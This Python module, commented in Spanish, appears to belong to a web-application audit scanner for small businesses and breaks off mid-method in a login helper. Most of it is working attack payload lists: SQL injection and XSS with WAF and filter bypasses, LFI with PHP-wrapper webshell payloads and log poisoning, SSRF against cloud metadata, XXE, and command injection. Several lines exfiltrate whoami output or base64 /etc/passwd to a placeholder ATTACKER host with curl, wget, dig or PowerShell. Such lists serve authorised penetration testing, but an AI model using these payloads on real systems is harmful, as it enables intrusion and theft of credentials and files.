"""
Módulo de análisis de aplicación web — AuditPyme v1.0
Comprobaciones OWASP Top 10 para pymes.
REQUIERE autorización escrita del cliente antes de usar.

Checks disponibles:
  - sqli     : Inyección SQL (error-based, time-based, boolean-based, WAF bypass)
  - xss      : Cross-Site Scripting reflejado (bypass de filtros comunes, DOM XSS)
  - lfi      : Local File Inclusion (PHP wrappers, traversal encoding, log paths)
  - redirect : Open Redirect (bypass @, %2F, unicode, parameter pollution)
  - cmdi     : Inyección de comandos OS (bypass IFS, OOB, time-based sin sleep)
  - ssrf     : Server-Side Request Forgery (metadata cloud, IP bypass)
  - xxe      : XML External Entity (file read, blind OOB, content-type switching)
  - idor     : Insecure Direct Object Reference
  - csrf     : Ausencia de tokens CSRF en formularios

Payloads actualizados 2023-2025. Fuentes: PortSwigger, PayloadsAllTheThings,
OWASP Testing Guide, HackTricks, writeups CTF/bug-bounty.
"""

import requests
import urllib3
import time
import re
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 10
UA = "Mozilla/5.0 (compatible; AuditPyme/1.0)"

# ── Payloads ──────────────────────────────────────────────────────────────────
# Fuentes: PortSwigger Web Security Academy, PayloadsAllTheThings,
#          OWASP Testing Guide, HackTricks, writeups CTF/bug-bounty 2023-2025

# ── SQL Injection — Error-based ───────────────────────────────────────────────
# Detectan errores verbosos en MySQL, PostgreSQL, MSSQL, Oracle, SQLite.
# Técnica: funciones XPATH/CAST provocan mensajes de error que revelan datos.
SQLI_ERROR_PAYLOADS = [
    # --- Detección genérica (rompen sintaxis) ---
    "'",                                        # comilla simple clásica
    "\"",                                       # comilla doble
    "' OR '1'='1'--",                           # bypass autenticación básico
    "' OR 1=1--",                               # bypass con comentario
    "\" OR 1=1--",
    "') OR ('1'='1",                            # cierre de paréntesis
    # --- MySQL: EXTRACTVALUE (revela datos en mensaje de error XPath) ---
    "' AND EXTRACTVALUE(RAND(),CONCAT(0x7e,VERSION(),0x7e))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--",
    # --- MySQL: UPDATEXML (alternativa a EXTRACTVALUE) ---
    "' AND UPDATEXML(rand(),CONCAT(0x7e,version(),0x7e),null)--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
    # --- PostgreSQL: CAST a tipo numérico provoca error con el dato ---
    "' AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC)--",
    "' AND CAST((SELECT version()) AS INT)=1337--",
    "' AND (SELECT version())::int=1--",
    "' AND 1=cast((SELECT concat('DB:',current_database())) as int)--",
    # --- MSSQL: CONVERT/CAST fuerzan error de conversión con el valor ---
    "' AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~'))--",
    "' AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~'))--",
    "' AND CAST((SELECT @@version) AS INT)=1--",
    "' AND 1 IN (SELECT @@version)--",
    # --- Oracle: UTL_INADDR y funciones XML provocan errores con datos ---
    "' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--",
    "' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))--",
    "' AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT banner FROM v$version)||'~')--",
    # --- SQLite: LOAD_EXTENSION con valor inválido (error condicional) ---
    "' AND CASE WHEN (1=1) THEN 1 ELSE load_extension(1) END--",
    # --- WAF bypass: mismas técnicas con ofuscación ---
    "'/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",  # comentarios como espacios
    "' /*!50000AND*/ EXTRACTVALUE(1,CONCAT(0x7e,version()))--",   # comentarios versionados MySQL
    "%27%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,version()))--",        # URL encoding
]

# Firmas de error que revelan el motor de base de datos (detección pasiva)
SQLI_ERROR_SIGNS = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "supplied argument is not a valid mysql",
    "com.mysql.jdbc",
    # PostgreSQL
    "pg_query",
    "pg_exec",
    "postgresql",
    "psql",
    "unterminated quoted string",
    # MSSQL
    "unclosed quotation mark",
    "microsoft sql server",
    "microsoft jet database",
    "odbc microsoft access",
    "mssql_query",
    "syntax error converting",
    # Oracle
    "ora-",
    "oracle error",
    "quoted string not properly terminated",
    # Genérico
    "sql syntax",
    "syntax error",
    "native client",
    "jdbc",
    "db2 sql error",
    "sqlite",
    "sqliteexception",
    # PHP
    "warning: pg_",
    "pdo",
    "doctrine",
    "eloquent",
]

# ── SQL Injection — Time-based blind ─────────────────────────────────────────
# Cada motor usa una función diferente. Se detecta por latencia >= umbral.
# Incluimos variantes con bypass de WAF (comentarios, codificación).
SQLI_TIME_PAYLOADS = [
    # MySQL — SLEEP
    "' AND SLEEP(4)--",
    "' AND SLEEP(4)#",
    "' AND IF(1=1,SLEEP(4),0)--",
    "' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>0,SLEEP(4),0)--",
    "' AND (SELECT SLEEP(4) FROM DUAL WHERE DATABASE() LIKE '%')--",
    # MySQL — BENCHMARK (alternativa sin SLEEP, útil si SLEEP está bloqueado)
    "' AND BENCHMARK(20000000,MD5(1337))--",
    "' AND IF(1=1,BENCHMARK(20000000,SHA1(1)),0)--",
    # MySQL — WAF bypass con comentarios y espacios alternativos
    "'/**/AND/**/SLEEP(4)--",
    "' AND SLEEP/**/( 4 )--",
    "'%09AND%09SLEEP(4)--",                     # tab como espacio
    "' AND SLEEP(4)%0a--",                      # newline
    "'/*!50000AND*/ SLEEP(4)--",                # comentario versionado
    # MSSQL — WAITFOR DELAY
    "'; WAITFOR DELAY '0:0:4'--",
    "'; WAITFOR DELAY '0:0:4'--",
    "');WAITFOR DELAY '0:0:4'--",
    "' IF(1=1) WAITFOR DELAY '0:0:4'--",
    "'; IF 1=1 WAITFOR DELAY '0:0:4' ELSE WAITFOR DELAY '0:0:0';--",
    # PostgreSQL — pg_sleep
    "' AND pg_sleep(4)--",
    "';SELECT pg_sleep(4)--",
    "'||(select 1 from pg_sleep(4))--",
    "' AND 'RAND'||PG_SLEEP(4)='RAND'--",
    "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(4) ELSE pg_sleep(0) END)--",
    # Oracle — DBMS_PIPE (no requiere privilegios especiales en 11g+)
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',4)--",
    "' AND CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',4) ELSE NULL END FROM dual--",
    # SQLite — RANDOMBLOB (genera carga de CPU, no hay sleep nativa)
    "' AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))--",
]

# Payload rápido para time-based (compatibilidad con código existente)
SQLI_TIME_PAYLOAD = "' AND SLEEP(4)--"
SQLI_TIME_PAYLOAD_MSSQL = "'; WAITFOR DELAY '0:0:4'--"

# ── SQL Injection — Boolean-based blind ──────────────────────────────────────
# Condiciones verdaderas vs falsas que producen respuestas diferentes.
SQLI_BOOLEAN_PAYLOADS = [
    # Condición verdadera (respuesta normal)
    "' AND 1=1--",
    "' AND '1'='1",
    "1 AND 1=1",
    # Condición falsa (respuesta vacía/diferente)
    "' AND 1=2--",
    "' AND '1'='2",
    "1 AND 1=2",
    # Extracción carácter a carácter (MySQL/genérico)
    "' AND SUBSTRING(database(),1,1)>'a'--",
    "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
    "' AND LENGTH(database())>1--",
    # PostgreSQL
    "' AND SUBSTRING(version(),1,10)='PostgreSQL'--",
    # MSSQL
    "' AND LEN((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))>0--",
    "' AND UNICODE(SUBSTRING((SELECT @@version),1,1))>0--",
    # WAF bypass: paréntesis y sin espacios
    "'AND(1)=(1)--",
    "'AND(SLEEP(0))=(0)--",
    "1'AND(1)=(1)AND'1'='1",
]

# ── SQL Injection — WAF bypass ────────────────────────────────────────────────
# Técnicas documentadas en investigación 2024-2025 que evaden firmas de IDS/WAF.
# Fuente: PayloadsAllTheThings, nav1n0x gitbook, Medium infosecmatrix 2025.
SQLI_WAF_BYPASS_PAYLOADS = [
    # Espacios alternativos: tab, newline, carriage return, form feed
    "1%09UNION%09SELECT%09NULL,NULL--",         # tab (0x09)
    "1%0aUNION%0aSELECT%0aNULL,NULL--",        # newline (0x0a)
    "1%0d%0aUNION%0d%0aSELECT%0d%0aNULL--",   # CRLF
    # Comentarios inline como separadores
    "1/**/UNION/**/SELECT/**/NULL,NULL--",
    "1/*!UNION*//*!SELECT*/NULL,NULL--",
    "1 /*!50000UNION*/ /*!50000SELECT*/ NULL--",  # versionado MySQL
    # Mayúsculas/minúsculas aleatorias (case mutation)
    "' uNiOn SeLeCt NuLl,NuLl--",
    "' UnIoN sElEcT null,null--",
    # Sin comas (bypass de WAF que filtra comas en UNION)
    "' UNION SELECT * FROM (SELECT NULL)a JOIN (SELECT NULL)b--",
    "' UNION SELECT NULL LIMIT 1 OFFSET 0--",
    # Sin signos de igualdad
    "' AND 1 LIKE 1--",
    "' AND 1 BETWEEN 1 AND 1--",
    "' AND SUBSTRING(version(),1,1) LIKE '5'--",
    # Encoding URL doble
    "%2527%2520UNION%2520SELECT%2520NULL,NULL--",
    # Encoding hexadecimal de palabras clave
    "' UNION SELECT 0x61646d696e,0x70617373776f7264--",
    # Inyección en cabeceras HTTP (X-Forwarded-For, User-Agent) — comentario ref.
    # Enviar payload en header: X-Forwarded-For: 1' AND SLEEP(4)--
    # JSON-based bypass (algunos WAF no inspeccionan JSON)
    # Content-Type: application/json — {"id": "1' AND SLEEP(4)--"}
    # Notación científica MySQL (bypass de filtros que buscan palabras clave)
    "1.e(0) UNION SELECT NULL--",
    "1' or 1.e('')='",
    # GBK/Wide-byte (PHP con mysql_real_escape_string + charset GBK)
    "%bf' OR 1=1--",
    "%a8%27 OR 1=1--",
]

# ── XSS — Payloads avanzados ──────────────────────────────────────────────────
# Cubren bypass de htmlspecialchars (sin ENT_QUOTES), strip_tags, filtros comunes.
# Fuente: PortSwigger XSS Cheat Sheet 2024, PayloadsAllTheThings, X-Vector/XSS_Bypass
XSS_PAYLOADS = [
    # --- Básicos (alta probabilidad de reflexión sin escape) ---
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    # --- Bypass de htmlspecialchars sin ENT_QUOTES (no escapa comilla simple) ---
    # Si el atributo usa comillas simples: value='USER_INPUT'
    "'onmouseover='alert(1)",
    "' onfocus='alert(1)' autofocus='",
    "'onerror='alert(1)'<img src=x '",
    # --- Bypass de strip_tags: anidamiento que se reconstruye tras eliminar tags ---
    "<scr<script>ipt>alert(1)</script>",       # strip_tags no recursivo
    "<scr<object>ipt>alert(1)</script>",        # mezcla de tags filtrados
    "<img src=x one<x>rror=alert(1)>",         # interrupción con tag ficticio
    # --- Event handlers alternativos (sin onload/onerror/onclick) ---
    # Animación CSS: no requiere interacción del usuario
    "<style>@keyframes x{}</style><div style='animation-name:x' onanimationstart='alert(1)'>",
    "<style>@keyframes x{}</style><div style='animation-name:x' onanimationend='alert(1)'>",
    # Auto-focus sin clic
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",         # HTML5: se activa al abrir/cerrar
    # SVG con animación (no requiere interacción)
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><animate onend=alert(1) attributeName=x dur=1s>",
    # Evento de medios (audio/video)
    "<audio oncanplay=alert(1)><source src='//x' type='audio/wav'></audio>",
    # Drag and drop (interacción mínima)
    "<div draggable=true ondrag=alert(1) style=display:block>arrastra</div>",
    # Pointer events (hover)
    "<div onpointerover=alert(1) style=display:block>HOVER</div>",
    # --- Contexto dentro de atributo (ya dentro de value="...") ---
    '" onmouseover="alert(1)',
    '" onfocus="alert(1)" autofocus="',
    '" onanimationstart="alert(1)" style="animation-name:x',
    # --- Contexto dentro de JavaScript (ya dentro de <script>) ---
    # Si la app hace: var x = 'USER_INPUT'; necesitamos salir del string
    "'-alert(1)-'",
    "';alert(1)//",
    "\\';alert(1)//",                           # cuando la app escapa ' con \
    "-(confirm)(document.domain)//",
    # --- Contexto dentro de CSS ---
    "</style><svg/onload=alert(1)>",
    "background:url('javascript:alert(1)')",
    # --- Encoding bypasses ---
    # Unicode escape en JS
    "<script>\\u0061lert(1)</script>",
    # Entidades HTML (funciona si el valor acaba en contexto HTML)
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    # Base64 en data URI
    '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    # javascript: URI (en href, src, action)
    "javascript:alert(1)",
    "javascript&#58;alert(1)",                  # entidad en href
    "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)",
    # --- DOM XSS ---
    "#<img src=x onerror=alert(1)>",
    "#\"><img src=x onerror=alert(1)>",
    # --- Mutation XSS (mXSS) — bypasea sanitizadores basados en DOM ---
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    # --- Custom tags (bypasa filtros que solo bloquean tags HTML estándar) ---
    "<xss onmouseover=alert(1)>hover</xss>",
    "<xss onfocus=alert(1) autofocus tabindex=1></xss>",
    # --- Blind XSS (para XSS almacenado no visible inmediatamente) ---
    '"><script src="https://js.rip/ATTACKER_DOMAIN"></script>',
    # --- Bypass de WAF con comentarios y codificación ---
    "<img src=x onerror=&#97;lert(1)>",        # entidad parcial
    "<img src=x onerror=\x61lert(1)>",          # hex en contexto JS
    "<svg/onload=alert(1)>",                    # sin espacio antes de onload
    "<IMG SRC=x OnErRoR=alert(1)>",             # case mixing
]

XSS_SIGNS = [
    "<script>alert(1)</script>",
    "<script>alert('xss')</script>",
    "onerror=alert(1)",
    "<svg onload=alert(1)>",
    "onmouseover='alert(1)",
    "onfocus=alert(1)",
    "onanimationstart='alert(1)",
    "ondrag=alert(1)",
    "onpointerover=alert(1)",
    "javascript:alert(1)",
    "&#x3c;script",
    "onbegin=alert(1)",
]

# ── LFI / Path Traversal ──────────────────────────────────────────────────────
# Fuente: PayloadsAllTheThings, PortSwigger Path Traversal, writeups 2024.
LFI_PAYLOADS = [
    # --- Traversal básico ---
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",             # puede revelar variables de entorno
    "../../../../proc/self/cmdline",
    "../../../../var/log/apache2/access.log",    # para log poisoning
    "../../../../var/log/nginx/access.log",
    "../../../../var/log/auth.log",
    "../../../../var/log/mail.log",
    # --- Windows ---
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "..\\..\\..\\..\\windows\\win.ini",
    # --- Null byte: termina la cadena antes de extensión forzada (PHP < 5.3.4) ---
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%00.php",
    "../../../../etc/passwd\x00",
    # --- Bypass de filtros que eliminan ../ simple (no recursivos) ---
    "....//....//....//etc/passwd",             # se convierte en ../../../etc/passwd
    r"....\/....\/....\/etc/passwd",
    "..///////..////..//////etc/passwd",
    "/%5C../%5C../%5C../%5C../etc/passwd",      # backslash URL encoded
    # --- Encoding para bypass de WAF ---
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoding
    "%252e%252e%252fetc%252fpasswd",             # doble URL encoding
    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",     # UTF-8 overlong encoding
    "..%c0%af..%c0%af..%c0%afetc/passwd",       # variante UTF-8
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",  # fullwidth slash
    # --- PHP wrappers (requieren allow_url_fopen o allow_url_include) ---
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../config.php",
    "php://filter/convert.base64-encode/resource=../wp-config.php",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",                              # ejecuta POST body como PHP (POST: <?php system($_GET['cmd']);?>)
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",  # <?php system($_GET['cmd']);?>
    "expect://id",                              # si está habilitado (raro)
    # --- Ruta absoluta (bypass de filtros que solo buscan ../) ---
    "/etc/passwd",
    "/etc/shadow",
    "/var/www/html/index.php",
    "/var/www/html/wp-config.php",
    # --- Log poisoning: incluir log después de envenenar User-Agent ---
    # Paso 1: petición con User-Agent: <?php system($_GET['cmd']); ?>
    # Paso 2: LFI al log de acceso + ?cmd=id
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/apache2/error.log",
    # --- LFI a RCE via /proc/self/environ (envenenamiento de env vars) ---
    # Prerequisito: User-Agent: <?php system('id'); ?>
    "/proc/self/environ",
    # --- Inclusión de archivos ZIP/PHAR (PHP wrappers avanzados) ---
    "zip://shell.zip%23shell.php",
    "phar://upload/avatar.jpg/shell.php",
    # --- Path truncation (sistemas con límite 4096 bytes en nombre de archivo) ---
    # "../../../etc/passwd" + "/"*4000 (trunca extensión añadida por la app)
]

LFI_SIGNS = [
    "root:x:0:0",
    "bin:x:",
    "daemon:x:",
    "nobody:x:",
    "[extensions]",                             # win.ini
    "for 16-bit app support",                  # win.ini
    "\\drivers\\etc",
    "HTTP_USER_AGENT",                          # /proc/self/environ
    "DOCUMENT_ROOT",
    "SCRIPT_FILENAME",
]

# ── Open Redirect ─────────────────────────────────────────────────────────────
# Fuente: PayloadsAllTheThings Open Redirect, OWASP Testing Guide 2024.
REDIRECT_PAYLOADS = [
    # --- Básicos ---
    "https://evil.com",
    "http://evil.com",
    "//evil.com",
    "////evil.com",
    "\\/\\/evil.com",
    # --- Bypass con @ (RFC 1738: user:pass@host) ---
    "https://legit.com@evil.com",
    "http://legit.com@evil.com/path",
    # --- Bypass con %40 (URL encoded @) ---
    "https://legit.com%40evil.com",
    # --- Bypass con %2F (URL encoded /) ---
    "https://evil.com%2F@legit.com",
    "/%2Fevil.com",
    # --- Bypass con doble slash ---
    "https:evil.com",                           # sin //
    "https:/evil.com",                          # un solo /
    # --- Bypass de validación de dominio (evil.com pasa validación de legit.com) ---
    "https://legit.com.evil.com",               # subdominio falso
    "https://legit.com%2Fevil.com",             # %2F como separador
    "https://evil.com/legit.com",               # path que parece dominio legit
    # --- Unicode/normalización ---
    "//evil%E3%80%82com",                       # punto unicode (。) en lugar de .
    "//evil．com",                              # fullwidth full stop
    # --- Null byte ---
    "//evil.com%00.legit.com",
    # --- Redirección vía ruta relativa ---
    "/redirect/https://evil.com",
    "/out?url=//evil.com",
    # --- Protocolo javascript (si no se valida esquema) ---
    "javascript:alert(document.domain)",
    # --- Contaminación de parámetros (parameter pollution) ---
    # ?next=legit.com&next=evil.com  (la app usa el último)
]

# ── Command Injection ─────────────────────────────────────────────────────────
# Fuente: PayloadsAllTheThings, payloadplayground.com, PortSwigger CMDi labs 2024.
CMDI_PAYLOADS = [
    # --- Separadores de comandos (Linux/Unix) ---
    "; sleep 4",
    "| sleep 4",
    "|| sleep 4",
    "& sleep 4",
    "&& sleep 4",
    "`sleep 4`",
    "$(sleep 4)",
    "%0asleep 4",                               # newline URL-encoded
    "%0d%0asleep 4",                            # CRLF
    # --- Separadores Windows ---
    "& ping -n 5 127.0.0.1 &",
    "| timeout /T 4",
    "|| timeout /T 4",
    # --- Bypass de filtros de espacios (sin espacio) ---
    ";cat${IFS}/etc/passwd",                    # $IFS = Internal Field Separator
    ";cat$IFS/etc/passwd",
    ";{cat,/etc/passwd}",                       # brace expansion
    ";cat</etc/passwd",                         # input redirection
    ";ls%09-la%09/",                            # tab (0x09) como espacio
    # --- Bypass de filtros de palabras (ofuscación) ---
    ";c'a't /etc/passwd",                       # comillas interrumpen la palabra
    ";c\"a\"t /etc/passwd",
    ";wh\\oami",                                # backslash en medio
    ";w$()hoami",                               # expansión vacía
    ";who$(x)ami",
    # --- Ejecución sin cat/id/whoami (si están en blacklist) ---
    ";tac /etc/passwd",                         # cat inverso
    ";head -1 /etc/passwd",
    ";xxd /etc/passwd",
    ";base64 /etc/passwd",
    # --- Time-based sin sleep (resistente a filtros de 'sleep') ---
    "& ping -c 4 127.0.0.1 &",                 # Linux: 4 pings ≈ 3s de espera
    "& ping -n 4 127.0.0.1 &",                 # Windows
    ";$(for i in {1..1000000};do :;done)",     # bucle CPU-bound
    # --- Blind CMDi out-of-band (DNS/HTTP exfiltración a servidor propio) ---
    # Sustituir ATTACKER por subdominio propio con listener DNS/HTTP
    "; nslookup `whoami`.ATTACKER",
    "; dig `whoami`.ATTACKER",
    "; curl http://ATTACKER/$(whoami)",
    "; wget http://ATTACKER/$(id|base64)",
    # Exfiltración encadenada base64 para datos con caracteres especiales
    "; curl http://ATTACKER/$(cat /etc/passwd | base64 | head -c 60)",
    # Windows — PowerShell OOB
    "& powershell -c \"Invoke-WebRequest http://ATTACKER/$env:USERNAME\" &",
    # --- Polyglot (funciona en múltiples contextos de quoting) ---
    "1;sleep${IFS}4;#${IFS}';sleep${IFS}4;#${IFS}\";sleep${IFS}4;#${IFS}",
]

# ── SSRF ──────────────────────────────────────────────────────────────────────
# Fuente: PayloadsAllTheThings SSRF, HackerOne reports, Medium writeups 2024.
SSRF_PAYLOADS = [
    # --- Localhost básico ---
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://127.1/",                            # forma corta
    "http://127.0.0.1:80/",
    "http://127.0.0.1:443/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    # --- IPv6 ---
    "http://[::1]/",
    "http://[::]/",
    "http://[::ffff:127.0.0.1]/",
    "http://[0000::1]:80/",
    # --- Representaciones alternativas de 127.0.0.1 ---
    "http://2130706433/",                       # decimal 127.0.0.1
    "http://0177.0.0.1/",                       # octal
    "http://0x7f000001/",                       # hexadecimal
    "http://127.000.000.001/",                  # ceros extra
    "http://127.0.0.1.nip.io/",                # DNS que resuelve a 127.0.0.1
    "http://localtest.me/",                     # resuelve a ::1
    "http://localh.st/",                        # resuelve a 127.0.0.1
    # --- Cloud metadata: AWS IMDSv1 (sin autenticación) ---
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    # --- Representaciones alternativas de 169.254.169.254 ---
    "http://2852039166/",                       # decimal
    "http://0xa9fea9fe/",                       # hexadecimal
    "http://0251.0376.0251.0376/",              # octal
    "http://169.254.169.254.nip.io/",
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    # --- GCP metadata ---
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    # --- Azure metadata ---
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # --- Esquemas alternativos ---
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "dict://127.0.0.1:6379/info",              # Redis
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",  # Redis via Gopher
    "ldap://127.0.0.1:389/",
    # --- Bypass via redirección (URL que redirige a IP interna) ---
    # Registrar: evil.com → 302 → http://169.254.169.254/
    # --- DNS Rebinding (TOCTOU) ---
    # Usar: rbndr.us, 1u.ms o servidor DNS propio con TTL=0
    "http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms/latest/meta-data/",
    # --- URL parser discrepancies ---
    "http://127.1.1.1:80\\@127.2.2.2:80/",
    "http:127.0.0.1/",
    # --- Puertos de servicios internos comunes ---
    "http://127.0.0.1:3306/",                  # MySQL
    "http://127.0.0.1:5432/",                  # PostgreSQL
    "http://127.0.0.1:6379/",                  # Redis
    "http://127.0.0.1:27017/",                 # MongoDB
    "http://127.0.0.1:9200/",                  # Elasticsearch
    "http://127.0.0.1:2375/",                  # Docker daemon
    "http://127.0.0.1:8500/",                  # Consul
]

# ── XXE — XML External Entity ─────────────────────────────────────────────────
# Fuente: PortSwigger XXE Labs, PayloadsAllTheThings XXE, writeups 2024.
XXE_PAYLOADS = [
    # --- Lectura de archivos básica ---
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
    # --- PHP filter wrapper (base64 del fuente PHP) ---
    '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">]><root>&xxe;</root>',
    # --- XXE → SSRF (acceso a servicios internos) ---
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]><foo>&xxe;</foo>',
    # --- Blind XXE out-of-band: callback DNS/HTTP a servidor del atacante ---
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://ATTACKER/xxe.dtd">%ext;]><r></r>',
    # DTD externo para blind XXE (alojar en http://ATTACKER/xxe.dtd):
    # <!ENTITY % file SYSTEM "file:///etc/passwd">
    # <!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER/?%file;'>">
    # %all;
    # --- XInclude (cuando no se controla el DOCTYPE) ---
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    # --- XXE via SVG (upload de imagen SVG) ---
    '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
    # --- XXE via cambio de Content-Type (JSON → XML) ---
    # Cambiar: Content-Type: application/json → Content-Type: application/xml
    # Body XML:
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
    # --- Base64 para bypass de filtros de contenido ---
    '<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">%init;]><foo/>',
    # --- Error-based XXE (datos en mensaje de error del parser) ---
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % error "<!ENTITY &#x25; err SYSTEM \'file:///nope/%xxe;\'>">%error;%err;]><foo/>',
]

# ── IDOR patterns (sin cambios, solo referencia) ──────────────────────────────

IDOR_PATTERNS = [
    r'[?&](id|user_id|account|order|file|doc|record|item)=(\d+)',
    r'/(\d{3,10})(?:/|\?|$)',
    r'[?&](uuid|guid)=([a-f0-9\-]{32,36})',
]

# Parámetros sensibles a LFI (ampliadados)
LFI_PARAM_KEYWORDS = (
    "page", "file", "path", "include", "load", "template",
    "view", "doc", "lang", "module", "content", "read",
    "location", "show", "display", "open", "dir", "folder",
)

# Parámetros sensibles a redirect (ampliados)
REDIRECT_PARAM_KEYWORDS = (
    "redirect", "url", "next", "return", "goto",
    "target", "redir", "destination", "forward",
    "to", "out", "link", "checkout_url", "return_to",
    "back", "continue", "callback",
)


class WebAppScanner:
    def __init__(self, target: str, checks: list = None, stealth: bool = False,
                 auth_user: str = None, auth_pass: str = None, auth_url: str = None):
        self.target = self._normalize_url(target)
        self.checks = checks or ["sqli", "xss", "lfi", "redirect", "cmdi", "csrf", "idor", "ssrf", "xxe"]
        self.delay = 1.5 if stealth else 0
        self.auth_user = auth_user
        self.auth_pass = auth_pass
        self.auth_url = auth_url
        self.findings = []
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": UA})
        self.session.verify = False
        self._visited = set()
        self._forms = []
        self._params = []

    def _login(self):
        """Intenta autenticarse. Usa la misma sesión para GET (token CSRF) y POST."""
        login_url = self.auth_url or (self.target + "/login")
        try:
            # GET con la misma sesión para capturar cookies y token CSRF
            resp = self.session.get(login_url, timeout=TIMEOUT)
            # Extraer tags <input> completos y luego name/value por separado
            input_tags = re.findall(r'<input[^>]+>', resp.text, re.IGNORECASE)
            all_inputs = []
            for tag in input_tags:
                name_m  = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
                value_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.IGNORECASE)
                if name_m:
                    all_inputs.append((name_m.group(1), value_m.group(1) if value_m else ''))
            data = {name: value for name, value in all_inputs if name.lower() not in ("submit",)}
            # Identificar campos de usuario y contraseña
            user_field = next((n for n, _ in all_inputs if any(k in n.lower() for k in ("user", "email", "login"))), "username")
            pass_field = next((n for n, _ in all_inputs if any(k in n.lower() for k in ("pass", "pwd", "secret"))), "password")
            data[user_field] = self.auth_user
            data[pass_field] = self.auth_pass
            # POST con la MISMA sesión (mismas cookies) para que el token CSRF sea válido
            r = self.session.post(login_url, data=data, timeout=TIMEOUT, allow_redirects=True)
            if "login" not in r.url.lower():
